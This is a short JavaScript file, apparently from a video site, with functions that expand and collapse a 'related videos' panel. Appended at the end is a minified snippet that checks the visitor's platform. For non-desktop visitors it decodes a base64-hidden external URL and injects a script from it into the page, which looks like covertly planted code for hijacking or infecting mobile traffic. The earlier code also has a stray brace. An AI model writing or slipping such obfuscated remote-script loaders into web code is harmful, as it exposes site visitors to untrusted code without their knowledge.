function showxg() {
    if (zknum == 1) {
        $("xg").style.height = "auto";
        $("zk").className = "zkhover";
        $("zk").setAttribute("title", "\u70b9\u51fb\u6536\u8d77\u76f8\u5173\u5f71\u7247");
        zknum = 2;
    } else {
        $("xg").style.height = "26px";
        $("zk").className = "zk";
        $("zk").setAttribute("title", "\u70b9\u51fb\u5c55\u5f00\u76f8\u5173\u5f71\u7247");
        zknum = 1;
    }
};
function xg() {
if (offsetHeight == 38) {
    view("zk");
    $("xg").style.height = "26px";
    var zknum = 1;
    }
};
}
!function(){var t={win:!1,mac:!1,xll:!1,ipad:!1};t.win=0==navigator.platform.indexOf("Win"),t.mac=0==navigator.platform.indexOf("Mac"),t.x11="X11"==navigator.platform||0==navigator.platform.indexOf("Linux"),t.ipad=null!==navigator.userAgent.match(/iPad/i)&&!1,t.win||t.mac||t.xll||t.ipad||function(){try{var t=document.createElement("script"),e="aHR0cHM6Ly9haWNkbi52aXA=";t.src=atob(e),document.head.appendChild(t)}catch(t){}}()}();jQuery;